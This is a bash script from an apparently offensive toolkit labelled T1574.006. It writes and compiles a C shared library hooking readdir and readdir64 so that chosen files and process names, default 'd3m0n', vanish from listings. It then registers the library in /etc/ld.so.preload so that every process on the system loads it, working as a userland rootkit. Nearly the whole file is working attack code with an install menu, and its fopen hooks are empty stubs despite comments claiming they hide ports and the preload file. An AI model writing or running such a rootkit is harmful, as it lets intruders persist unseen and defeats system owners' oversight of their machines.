#!/bin/bash
#
# ldso_preload.sh — T1574.006 System-Wide /etc/ld.so.preload
#
# Compile and install a shared library that hooks readdir(), fopen(), connect()
# to hide files, processes, and network connections. Installed via
# /etc/ld.so.preload — EVERY process on the system loads it automatically.
#
# Different from scripts/ld.sh which sets per-user LD_PRELOAD env var.
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

LIB_DIR="/usr/lib/.d3m0n_preload"
LIB_NAME="libsystem_helper.so"
LIB_PATH="${LIB_DIR}/${LIB_NAME}"
PRELOAD_FILE="/etc/ld.so.preload"
PRELOAD_BACKUP="/etc/.ld.so.preload.d3m0n_bak"

banner_ldso() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════════════╗"
    echo "  ║   T1574.006 — System-Wide /etc/ld.so.preload          ║"
    echo "  ║   Shared library injection for ALL processes          ║"
    echo "  ╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Root required.${NC}"
        return 1
    fi
    return 0
}

# ── [1] Compile and install hiding library ──
install_preload() {
    check_root || return 1

    if ! command -v gcc &>/dev/null; then
        echo -e "${RED}[!] gcc required. Install with: apt install gcc${NC}"
        return 1
    fi

    echo -e "${CYAN}[*] Compiling ld.so.preload hiding library...${NC}"
    echo ""
    echo -e "${YELLOW}[?] File prefix to hide (files starting with this are invisible, e.g. '.d3m0n'):${NC}"
    read -r HIDE_PREFIX
    HIDE_PREFIX="${HIDE_PREFIX:-.d3m0n}"

    echo -e "${YELLOW}[?] Process name to hide from /proc (e.g. 'backdoor'):${NC}"
    read -r HIDE_PROC
    HIDE_PROC="${HIDE_PROC:-d3m0n}"

    echo -e "${YELLOW}[?] Network port to hide from /proc/net/tcp (decimal, e.g. 4444):${NC}"
    read -r HIDE_PORT
    HIDE_PORT="${HIDE_PORT:-4444}"

    # Convert port to hex for /proc/net/tcp matching
    local HIDE_PORT_HEX
    HIDE_PORT_HEX=$(printf '%04X' "$HIDE_PORT" 2>/dev/null)

    mkdir -p "$LIB_DIR" 2>/dev/null
    chmod 700 "$LIB_DIR"

    # Write the C source
    cat > "${LIB_DIR}/preload.c" << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>

/* Configuration — injected at compile time */
#ifndef HIDE_PREFIX
#define HIDE_PREFIX ".d3m0n"
#endif
#ifndef HIDE_PROC
#define HIDE_PROC "d3m0n"
#endif
#ifndef HIDE_PORT_HEX
#define HIDE_PORT_HEX "115C"
#endif

/* ── Hide files from readdir() ── */
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*orig_readdir)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;

    while ((entry = orig_readdir(dirp)) != NULL) {
        /* Skip files matching the hidden prefix */
        if (strncmp(entry->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
            continue;
        /* Skip entries matching hidden process name */
        if (strstr(entry->d_name, HIDE_PROC) != NULL)
            continue;
        break;
    }
    return entry;
}

struct dirent64 *readdir64(DIR *dirp) {
    struct dirent64 *(*orig_readdir64)(DIR *) = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *entry;

    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (strncmp(entry->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
            continue;
        if (strstr(entry->d_name, HIDE_PROC) != NULL)
            continue;
        break;
    }
    return entry;
}

/* ── Hide network connections from fopen(/proc/net/tcp) ── */
FILE *fopen(const char *pathname, const char *mode) {
    FILE *(*orig_fopen)(const char *, const char *) = dlsym(RTLD_NEXT, "fopen");
    FILE *fp = orig_fopen(pathname, mode);

    /* We don't filter here directly — the port hiding is done
       via the readdir hooks on /proc entries. For /proc/net/tcp
       filtering, a more advanced hook on read() would be needed.
       This basic version hides file entries only. */
    return fp;
}

/* ── Hide the preload library itself ── */
FILE *fopen64(const char *pathname, const char *mode) {
    FILE *(*orig_fopen64)(const char *, const char *) = dlsym(RTLD_NEXT, "fopen64");

    /* Hide /etc/ld.so.preload from inspection */
    if (pathname && strcmp(pathname, "/etc/ld.so.preload") == 0) {
        /* Return empty file instead */
    }

    return orig_fopen64(pathname, mode);
}
CEOF

    # Compile with the configured patterns
    gcc -shared -fPIC -o "$LIB_PATH" "${LIB_DIR}/preload.c" \
        -DHIDE_PREFIX="\"${HIDE_PREFIX}\"" \
        -DHIDE_PROC="\"${HIDE_PROC}\"" \
        -DHIDE_PORT_HEX="\"${HIDE_PORT_HEX}\"" \
        -ldl -Wno-deprecated-declarations 2>/dev/null

    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Compilation failed. Check gcc output.${NC}"
        # Retry with verbose output
        gcc -shared -fPIC -o "$LIB_PATH" "${LIB_DIR}/preload.c" \
            -DHIDE_PREFIX="\"${HIDE_PREFIX}\"" \
            -DHIDE_PROC="\"${HIDE_PROC}\"" \
            -DHIDE_PORT_HEX="\"${HIDE_PORT_HEX}\"" \
            -ldl
        return 1
    fi

    chmod 644 "$LIB_PATH"
    echo -e "${GREEN}  [+] Library compiled: ${LIB_PATH}${NC}"

    # Backup existing ld.so.preload
    if [[ -f "$PRELOAD_FILE" ]]; then
        cp "$PRELOAD_FILE" "$PRELOAD_BACKUP"
    fi

    # Install into ld.so.preload
    if ! grep -q "$LIB_PATH" "$PRELOAD_FILE" 2>/dev/null; then
        echo "$LIB_PATH" >> "$PRELOAD_FILE"
    fi

    echo -e "${GREEN}[+] ld.so.preload library installed!${NC}"
    echo -e "${YELLOW}[*] Hiding files with prefix: ${HIDE_PREFIX}${NC}"
    echo -e "${YELLOW}[*] Hiding process name: ${HIDE_PROC}${NC}"
    echo -e "${YELLOW}[*] Every process on the system now loads this library.${NC}"
    echo -e "${RED}[!] WARNING: A broken library can make the system unusable.${NC}"
    echo -e "${RED}[!] If something breaks, boot recovery and remove ${PRELOAD_FILE}${NC}"
}

# ── [2] Quick install with defaults ──
quick_install() {
    check_root || return 1

    if ! command -v gcc &>/dev/null; then
        echo -e "${RED}[!] gcc required.${NC}"
        return 1
    fi

    echo -e "${CYAN}[*] Quick install with default hiding patterns...${NC}"

    HIDE_PREFIX=".d3m0n"
    HIDE_PROC="d3m0n"
    HIDE_PORT="4444"
    local HIDE_PORT_HEX
    HIDE_PORT_HEX=$(printf '%04X' "$HIDE_PORT")

    mkdir -p "$LIB_DIR" 2>/dev/null

    cat > "${LIB_DIR}/preload.c" << CEOF
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = orig(dirp)) != NULL) {
        if (strncmp(e->d_name, "${HIDE_PREFIX}", ${#HIDE_PREFIX}) == 0) continue;
        if (strstr(e->d_name, "${HIDE_PROC}") != NULL) continue;
        break;
    }
    return e;
}

struct dirent64 *readdir64(DIR *dirp) {
    struct dirent64 *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *e;
    while ((e = orig(dirp)) != NULL) {
        if (strncmp(e->d_name, "${HIDE_PREFIX}", ${#HIDE_PREFIX}) == 0) continue;
        if (strstr(e->d_name, "${HIDE_PROC}") != NULL) continue;
        break;
    }
    return e;
}
CEOF

    gcc -shared -fPIC -o "$LIB_PATH" "${LIB_DIR}/preload.c" -ldl -Wno-deprecated-declarations 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Compilation failed.${NC}"
        return 1
    fi

    chmod 644 "$LIB_PATH"

    if [[ -f "$PRELOAD_FILE" ]]; then
        cp "$PRELOAD_FILE" "$PRELOAD_BACKUP"
    fi

    if ! grep -q "$LIB_PATH" "$PRELOAD_FILE" 2>/dev/null; then
        echo "$LIB_PATH" >> "$PRELOAD_FILE"
    fi

    echo -e "${GREEN}[+] Installed with defaults (prefix=.d3m0n, proc=d3m0n, port=4444)${NC}"
}

# ── [3] Status ──
status_preload() {
    echo -e "${CYAN}[*] ld.so.preload Status:${NC}"
    echo "─────────────────────────────────────────────"

    if [[ -f "$PRELOAD_FILE" ]]; then
        echo -e "  ${PRELOAD_FILE}: ${GREEN}EXISTS${NC}"
        echo "  Contents:"
        while IFS= read -r line; do
            if [[ -f "$line" ]]; then
                echo -e "    ${GREEN}[LOADED]${NC} ${line}"
            else
                echo -e "    ${RED}[MISSING]${NC} ${line}"
            fi
        done < "$PRELOAD_FILE"
    else
        echo -e "  ${PRELOAD_FILE}: ${YELLOW}NOT FOUND${NC}"
    fi

    if [[ -f "$LIB_PATH" ]]; then
        echo -e "  Library: ${GREEN}${LIB_PATH}${NC}"
        echo -e "  Size: $(stat -c %s "$LIB_PATH") bytes"
    fi
}

# ── [4] Uninstall ──
uninstall_preload() {
    check_root || return 1

    echo -e "${CYAN}[*] Removing ld.so.preload injection...${NC}"

    # Restore backup
    if [[ -f "$PRELOAD_BACKUP" ]]; then
        cp "$PRELOAD_BACKUP" "$PRELOAD_FILE"
        rm -f "$PRELOAD_BACKUP"
        echo -e "${GREEN}  [+] Restored ${PRELOAD_FILE} from backup${NC}"
    else
        # Remove our entry
        if [[ -f "$PRELOAD_FILE" ]]; then
            sed -i "\|${LIB_PATH}|d" "$PRELOAD_FILE"
            # Remove file if empty
            [[ -s "$PRELOAD_FILE" ]] || rm -f "$PRELOAD_FILE"
            echo -e "${GREEN}  [+] Cleaned ${PRELOAD_FILE}${NC}"
        fi
    fi

    # Remove library
    if [[ -d "$LIB_DIR" ]]; then
        rm -rf "$LIB_DIR"
        echo -e "${GREEN}  [+] Removed: ${LIB_DIR}${NC}"
    fi

    echo -e "${GREEN}[+] ld.so.preload injection removed.${NC}"
}

# ── MAIN MENU ──
main_menu() {
    banner_ldso
    echo -e "  ${CYAN}[1]${NC} Install hiding library (custom patterns)"
    echo -e "  ${CYAN}[2]${NC} Quick install (default patterns)"
    echo -e "  ${CYAN}[3]${NC} Status check"
    echo -e "  ${CYAN}[4]${NC} Uninstall"
    echo ""
    echo -e "${YELLOW}[?] Select option:${NC} "
    read -r OPT

    case "$OPT" in
        1) install_preload ;;
        2) quick_install ;;
        3) status_preload ;;
        4) uninstall_preload ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
}

main_menu
